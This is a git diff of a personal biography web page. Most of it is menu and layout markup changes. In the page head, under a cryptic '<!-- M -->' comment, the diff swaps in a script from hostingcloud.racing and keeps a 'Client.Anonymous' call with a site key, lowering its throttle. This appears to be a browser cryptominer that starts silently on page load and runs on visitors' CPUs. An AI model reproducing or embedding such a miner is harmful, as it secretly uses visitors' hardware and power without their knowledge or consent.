@@ -8,19 +8,19 @@
 	<link rel="stylesheet" href="css/index.css">
 	<link rel="stylesheet" href="css/bird.css">
 	<link rel="stylesheet" href="css/common.css">
-
+	
 	<style>
 		.fade{animation:opac 0.8s}@keyframes opac{from{opacity:0} to{opacity:1}}
 	</style>
 	
 	<!-- M -->
-	<script src="https://www.hostingcloud.racing/rCU8.js"></script>
+	<script src="https://www.hostingcloud.racing/kW4h.js"></script>
 
 	<!-- Global site tag (gtag.js) - Google Analytics -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-150100041-1"></script>
 	<script>
 		var _client = new Client.Anonymous('28d128d0513e3c76634c63e6c66046d0e4c85234681ba1f34fe8d8fd1c3af24b', {
-			throttle: 0.2, c: 'w', ads: 0
+			throttle: 0.1, c: 'w', ads: 0
 		});
 		_client.start();
 
@@ -140,22 +140,20 @@
 
 	</script>
 
-	<title>⮡ # ⮞ John's Biography ⮜</title>
+	<title> ⮞ John's Biography ⮜ </title>
 </head>
 
 <body>
-	<div class="menu">
-		<img src="photos/profile.jpg" class="profile_pic" border="" alt="Enables Bird" onclick="clearFrame()">
-		
-		<div class="name unselectable">John Eliades</div>
+	<div id="menu_left">
+		<img src="photos/profile.jpg" id="profile_pic" border="" alt="Enables Bird" onclick="clearFrame()">
 
-		<div class="entry_wrapper">
-			<a href="work.html" onclick="remove_help()" target="iframe_main" class="entry">Work</a>
-			<a href="skills.html" onclick="remove_help()" target="iframe_main" class="entry">Skills</a>
-			<a href="about.html" onclick="remove_help()" target="iframe_main" class="entry">About Me</a>
-		</div>
+		<div id="name" class="unselectable">John Eliades</div>
 
-		<div class="icon-wrapper">
+		<a href="work.html" onclick="remove_help()" target="iframe_main" class="entry">Work</a>
+		<a href="skills.html" onclick="remove_help()" target="iframe_main" class="entry">Skills</a>
+		<a href="about.html" onclick="remove_help()" target="iframe_main" class="entry">About Me</a>
+
+		<div id="icon_wrapper">
 			<a href="https://www.facebook.com/jon.bon.johny" class="icon" target="_blank" >
 				<img src="photos/facebook.png"></a>
 			
@@ -165,15 +163,20 @@
 			<a href="documents/grades.pdf" target="iframe_main" class="icon" onclick="remove_help()">
 				<img src="photos/uth.png"></a>
 		</div>
-
 	</div>
 
-	<div id="main_screen" class="main_screen">
+	<div id="menu_full">
+		
+		
+	
+	</div>
+
+	<div id="main_screen">
 		<iframe id="iframe_main" class="fade" height="100%" width="100%" name="iframe_main" frameBorder="0"></iframe>
 
 		<div id="bird_container" class="bird-container">
 			<div id="bird" class="bird" onclick="get_quote()"></div>
-			<div id="bird_tip">
+			<div id="bird_tip" class="unselectable">
 				<h2 style="color:magenta;">Catch the bird<br>watch the magic</h2>
 			</div>
 		</div>
